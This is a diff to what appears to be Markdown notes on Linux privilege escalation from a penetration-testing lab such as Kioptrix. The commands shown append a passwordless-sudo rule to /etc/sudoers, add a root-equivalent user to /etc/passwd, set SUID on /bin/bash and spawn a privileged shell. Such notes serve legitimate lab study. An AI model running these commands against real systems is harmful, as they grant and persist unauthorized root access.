@@ -79,6 +79,10 @@ networking
 `mount`
 `/bin/lsblk`
 
+**What processes and services are running?  Which are running as root?
+`ps –ef
+`ps –ef | grep root
+
 **Scripts that can be used if they run as root:
 `echo “user ALL=(ALL) NOPASSWD:ALL” >> /etc/sudoers
 `echo “user::0:0:System Administrator:/root/root:/bin/bash” >> /etc/passwd
@@ -91,9 +95,9 @@ To:
 `loneferret ALL=NOPASSWD: /bin/su, /usr/local/bin/ht 
 `loneferret@Kioptrix3:~$ sudo /bin/su 
 
-**What processes and services are running?  Which are running as root?
-`ps –ef
-`ps –ef | grep root
+**Can you set a SUID on bash?
+`chmod +s /bin/bash`
+`/bin/bash -p`
 
 **Is /etc/passwd writable?**
 Removing x means root requires no password
